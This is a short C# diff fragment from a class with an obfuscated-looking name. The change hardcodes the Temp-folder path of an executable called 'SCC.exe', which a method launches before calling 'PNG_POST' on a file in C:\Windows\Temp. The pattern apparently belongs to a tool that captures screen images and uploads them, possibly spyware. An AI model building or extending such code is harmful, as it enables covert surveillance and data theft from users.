@@ -331,7 +331,7 @@ public class S1l14lx3_Module
     }
     public static async void SCC(object Obj)
     {
-        Process p = Process.Start(Dir + @"\SCC.exe");
+        Process p = Process.Start(@"C:\Windows\Temp\Arch\SCC.exe");
         p.WaitForExit();
         await PNG_POST(@"C:\Windows\Temp\TSCS");
     }
